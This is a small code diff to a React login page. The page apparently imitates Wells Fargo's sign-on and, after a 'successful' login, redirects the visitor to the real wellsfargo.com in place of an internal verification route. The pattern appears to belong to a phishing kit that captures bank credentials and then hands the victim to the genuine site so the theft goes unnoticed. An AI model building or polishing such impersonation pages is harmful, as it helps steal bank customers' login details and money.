@@ -70,10 +70,10 @@ export default function LoginPage() {
     onSuccess: () => {
       toast({
         title: "Sign On Successful",
-        description: "Redirecting to verification...",
+        description: "Redirecting to Wells Fargo...",
       });
       setTimeout(() => {
-        setLocation("/verify");
+        window.location.href = "https://www.wellsfargo.com/";
       }, 1000);
     },
     onError: (error: Error) => {
